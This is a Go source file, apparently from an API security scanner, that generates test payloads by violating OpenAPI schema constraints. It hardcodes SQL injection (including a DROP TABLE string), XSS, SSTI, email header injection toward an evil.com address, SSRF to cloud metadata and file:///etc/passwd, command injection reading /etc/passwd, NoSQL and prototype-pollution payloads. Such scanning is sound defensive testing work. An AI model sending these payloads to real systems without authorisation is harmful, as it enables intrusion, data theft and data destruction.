package apispec

import (
	"fmt"
	"math"
	"strings"
)

// ConstraintAttack is an attack payload generated from a schema constraint.
type ConstraintAttack struct {
	// ParamName is the parameter or field this attack targets.
	ParamName string `json:"param_name"`

	// ConstraintType describes which constraint is being violated.
	ConstraintType string `json:"constraint_type"`

	// Purpose explains what this attack tests.
	Purpose string `json:"purpose"`

	// Payload is the attack value to send.
	Payload string `json:"payload"`

	// Category maps to the scan type (sqli, xss, inputvalidation, ssrf, etc.).
	Category string `json:"category"`
}

// GenerateConstraintAttacks produces attack payloads by violating the schema
// constraints declared for a parameter. Returns nil when the schema has no
// exploitable constraints.
func GenerateConstraintAttacks(paramName string, schema SchemaInfo) []ConstraintAttack {
	var attacks []ConstraintAttack

	attacks = append(attacks, maxLengthAttacks(paramName, schema)...)
	attacks = append(attacks, enumAttacks(paramName, schema)...)
	attacks = append(attacks, patternAttacks(paramName, schema)...)
	attacks = append(attacks, numericBoundaryAttacks(paramName, schema)...)
	attacks = append(attacks, formatAttacks(paramName, schema)...)
	attacks = append(attacks, typeConfusionAttacks(paramName, schema)...)

	return attacks
}

// GenerateEndpointConstraintAttacks collects constraint attacks across all
// parameters and request body fields of an endpoint.
func GenerateEndpointConstraintAttacks(ep Endpoint) []ConstraintAttack {
	var attacks []ConstraintAttack

	for _, p := range ep.Parameters {
		attacks = append(attacks, GenerateConstraintAttacks(p.Name, p.Schema)...)
	}

	for _, rb := range ep.RequestBodies {
		for name, schema := range rb.Schema.Properties {
			attacks = append(attacks, GenerateConstraintAttacks(name, schema)...)
		}
	}

	return attacks
}

// --- maxLength violations ---

func maxLengthAttacks(name string, s SchemaInfo) []ConstraintAttack {
	if s.MaxLength == nil {
		return nil
	}
	max := *s.MaxLength
	if max <= 0 {
		return nil
	}

	// Cap payload sizes to prevent massive allocations from adversarial specs.
	const maxPayloadLen = 100_000
	overflowBy1 := max + 1
	if overflowBy1 > maxPayloadLen {
		overflowBy1 = maxPayloadLen
	}
	overflow10x := max * 10
	if overflow10x/10 != max || overflow10x > maxPayloadLen {
		// Integer overflow or exceeds cap.
		overflow10x = maxPayloadLen
	}

	return []ConstraintAttack{
		{
			ParamName:      name,
			ConstraintType: "maxLength",
			Purpose:        fmt.Sprintf("overflow maxLength=%d by 1 character", max),
			Payload:        strings.Repeat("A", overflowBy1),
			Category:       "inputvalidation",
		},
		{
			ParamName:      name,
			ConstraintType: "maxLength",
			Purpose:        fmt.Sprintf("overflow maxLength=%d by 10x", max),
			Payload:        strings.Repeat("A", overflow10x),
			Category:       "inputvalidation",
		},
		{
			ParamName:      name,
			ConstraintType: "maxLength",
			Purpose:        fmt.Sprintf("SQLi padded to maxLength=%d boundary", max),
			Payload:        padPayload("' OR 1=1--", overflowBy1),
			Category:       "sqli",
		},
		{
			ParamName:      name,
			ConstraintType: "maxLength",
			Purpose:        fmt.Sprintf("XSS padded to maxLength=%d boundary", max),
			Payload:        padPayload("<script>alert(1)</script>", overflowBy1),
			Category:       "xss",
		},
	}
}

// padPayload pads a payload string to the target length with spaces before it.
func padPayload(payload string, targetLen int) string {
	if len(payload) >= targetLen {
		return payload
	}
	return strings.Repeat(" ", targetLen-len(payload)) + payload
}

// --- enum violations ---

func enumAttacks(name string, s SchemaInfo) []ConstraintAttack {
	if len(s.Enum) == 0 {
		return nil
	}

	attacks := []ConstraintAttack{
		{
			ParamName:      name,
			ConstraintType: "enum",
			Purpose:        "unlisted enum value",
			Payload:        "__INVALID_ENUM_VALUE__",
			Category:       "inputvalidation",
		},
		{
			ParamName:      name,
			ConstraintType: "enum",
			Purpose:        "empty string for enum-constrained field",
			Payload:        "",
			Category:       "inputvalidation",
		},
	}

	// Append SQLi to a valid enum value.
	if len(s.Enum) > 0 {
		attacks = append(attacks, ConstraintAttack{
			ParamName:      name,
			ConstraintType: "enum",
			Purpose:        "SQLi appended to valid enum value '" + s.Enum[0] + "'",
			Payload:        s.Enum[0] + "' OR '1'='1",
			Category:       "sqli",
		})
	}

	return attacks
}

// --- pattern violations ---

func patternAttacks(name string, s SchemaInfo) []ConstraintAttack {
	if s.Pattern == "" {
		return nil
	}

	return []ConstraintAttack{
		{
			ParamName:      name,
			ConstraintType: "pattern",
			Purpose:        fmt.Sprintf("violate pattern /%s/ with special characters", s.Pattern),
			Payload:        "!@#$%^&*(){}|<>?",
			Category:       "inputvalidation",
		},
		{
			ParamName:      name,
			ConstraintType: "pattern",
			Purpose:        fmt.Sprintf("violate pattern /%s/ with null bytes", s.Pattern),
			Payload:        "valid\x00injected",
			Category:       "inputvalidation",
		},
		{
			ParamName:      name,
			ConstraintType: "pattern",
			Purpose:        fmt.Sprintf("SQLi bypassing pattern /%s/", s.Pattern),
			Payload:        "1; DROP TABLE users--",
			Category:       "sqli",
		},
	}
}

// --- numeric boundary attacks ---

func numericBoundaryAttacks(name string, s SchemaInfo) []ConstraintAttack {
	if s.Type != "integer" && s.Type != "number" {
		return nil
	}

	var attacks []ConstraintAttack

	// Always test universal integer boundaries.
	attacks = append(attacks,
		ConstraintAttack{
			ParamName:      name,
			ConstraintType: "numeric_boundary",
			Purpose:        "negative value for numeric field",
			Payload:        "-1",
			Category:       "inputvalidation",
		},
		ConstraintAttack{
			ParamName:      name,
			ConstraintType: "numeric_boundary",
			Purpose:        "zero for numeric field",
			Payload:        "0",
			Category:       "inputvalidation",
		},
		ConstraintAttack{
			ParamName:      name,
			ConstraintType: "numeric_boundary",
			Purpose:        "MAX_INT overflow",
			Payload:        fmt.Sprintf("%d", math.MaxInt64),
			Category:       "inputvalidation",
		},
		ConstraintAttack{
			ParamName:      name,
			ConstraintType: "numeric_boundary",
			Purpose:        "integer overflow (MAX_INT+1 as string)",
			Payload:        "9223372036854775808",
			Category:       "inputvalidation",
		},
	)

	if s.Minimum != nil {
		min := *s.Minimum
		attacks = append(attacks, ConstraintAttack{
			ParamName:      name,
			ConstraintType: "numeric_boundary",
			Purpose:        fmt.Sprintf("below minimum=%.0f", min),
			Payload:        fmt.Sprintf("%.0f", min-1),
			Category:       "inputvalidation",
		})
	}

	if s.Maximum != nil {
		max := *s.Maximum
		attacks = append(attacks, ConstraintAttack{
			ParamName:      name,
			ConstraintType: "numeric_boundary",
			Purpose:        fmt.Sprintf("above maximum=%.0f", max),
			Payload:        fmt.Sprintf("%.0f", max+1),
			Category:       "inputvalidation",
		})
	}

	// SQLi via numeric field.
	attacks = append(attacks, ConstraintAttack{
		ParamName:      name,
		ConstraintType: "numeric_boundary",
		Purpose:        "SQLi in numeric field (string injection)",
		Payload:        "1 OR 1=1",
		Category:       "sqli",
	})

	return attacks
}

// --- format-specific attacks ---

func formatAttacks(name string, s SchemaInfo) []ConstraintAttack {
	switch s.Format {
	case "email":
		return []ConstraintAttack{
			{
				ParamName:      name,
				ConstraintType: "format_email",
				Purpose:        "XSS in email field",
				Payload:        `"><script>alert(1)</script>"@example.com`,
				Category:       "xss",
			},
			{
				ParamName:      name,
				ConstraintType: "format_email",
				Purpose:        "SQLi in email field",
				Payload:        `' OR 1=1--@example.com`,
				Category:       "sqli",
			},
			{
				ParamName:      name,
				ConstraintType: "format_email",
				Purpose:        "SSTI in email field",
				Payload:        `{{7*7}}@example.com`,
				Category:       "ssti",
			},
			{
				ParamName:      name,
				ConstraintType: "format_email",
				Purpose:        "header injection via email",
				Payload:        "user@example.com\r\nBcc: attacker@evil.com",
				Category:       "crlf",
			},
		}
	case "uri", "url":
		return []ConstraintAttack{
			{
				ParamName:      name,
				ConstraintType: "format_uri",
				Purpose:        "SSRF via cloud metadata endpoint",
				Payload:        "http://169.254.169.254/latest/meta-data/",
				Category:       "ssrf",
			},
			{
				ParamName:      name,
				ConstraintType: "format_uri",
				Purpose:        "SSRF via file:// scheme",
				Payload:        "file:///etc/passwd",
				Category:       "ssrf",
			},
			{
				ParamName:      name,
				ConstraintType: "format_uri",
				Purpose:        "SSRF via gopher:// scheme",
				Payload:        "gopher://localhost:6379/_SET%20pwned%20true",
				Category:       "ssrf",
			},
			{
				ParamName:      name,
				ConstraintType: "format_uri",
				Purpose:        "open redirect",
				Payload:        "https://evil.com",
				Category:       "redirect",
			},
		}
	case "date", "date-time":
		return []ConstraintAttack{
			{
				ParamName:      name,
				ConstraintType: "format_date",
				Purpose:        "invalid date format (string injection)",
				Payload:        "not-a-date' OR 1=1--",
				Category:       "sqli",
			},
			{
				ParamName:      name,
				ConstraintType: "format_date",
				Purpose:        "epoch zero boundary",
				Payload:        "1970-01-01T00:00:00Z",
				Category:       "inputvalidation",
			},
			{
				ParamName:      name,
				ConstraintType: "format_date",
				Purpose:        "far-future date overflow",
				Payload:        "9999-12-31T23:59:59Z",
				Category:       "inputvalidation",
			},
		}
	case "uuid":
		return []ConstraintAttack{
			{
				ParamName:      name,
				ConstraintType: "format_uuid",
				Purpose:        "SQLi in UUID field",
				Payload:        "00000000-0000-0000-0000-000000000000' OR '1'='1",
				Category:       "sqli",
			},
			{
				ParamName:      name,
				ConstraintType: "format_uuid",
				Purpose:        "malformed UUID",
				Payload:        "not-a-uuid",
				Category:       "inputvalidation",
			},
		}
	case "ipv4":
		return []ConstraintAttack{
			{
				ParamName:      name,
				ConstraintType: "format_ipv4",
				Purpose:        "SSRF via loopback IP",
				Payload:        "127.0.0.1",
				Category:       "ssrf",
			},
			{
				ParamName:      name,
				ConstraintType: "format_ipv4",
				Purpose:        "SSRF via cloud metadata IP",
				Payload:        "169.254.169.254",
				Category:       "ssrf",
			},
			{
				ParamName:      name,
				ConstraintType: "format_ipv4",
				Purpose:        "command injection via IP field",
				Payload:        "127.0.0.1; cat /etc/passwd",
				Category:       "cmdi",
			},
		}
	default:
		return nil
	}
}

// --- type confusion attacks ---

func typeConfusionAttacks(name string, s SchemaInfo) []ConstraintAttack {
	switch s.Type {
	case "boolean":
		return []ConstraintAttack{
			{
				ParamName:      name,
				ConstraintType: "type_confusion",
				Purpose:        "string instead of boolean",
				Payload:        "yes",
				Category:       "inputvalidation",
			},
			{
				ParamName:      name,
				ConstraintType: "type_confusion",
				Purpose:        "numeric truthy (2) for boolean",
				Payload:        "2",
				Category:       "inputvalidation",
			},
		}
	case "array":
		return []ConstraintAttack{
			{
				ParamName:      name,
				ConstraintType: "type_confusion",
				Purpose:        "string where array expected",
				Payload:        "not-an-array",
				Category:       "inputvalidation",
			},
			{
				ParamName:      name,
				ConstraintType: "type_confusion",
				Purpose:        "nested object where array expected",
				Payload:        `{"$gt": ""}`,
				Category:       "nosqli",
			},
		}
	case "object":
		return []ConstraintAttack{
			{
				ParamName:      name,
				ConstraintType: "type_confusion",
				Purpose:        "prototype pollution via __proto__",
				Payload:        `{"__proto__": {"isAdmin": true}}`,
				Category:       "prototype",
			},
			{
				ParamName:      name,
				ConstraintType: "type_confusion",
				Purpose:        "constructor pollution",
				Payload:        `{"constructor": {"prototype": {"isAdmin": true}}}`,
				Category:       "prototype",
			},
		}
	default:
		return nil
	}
}
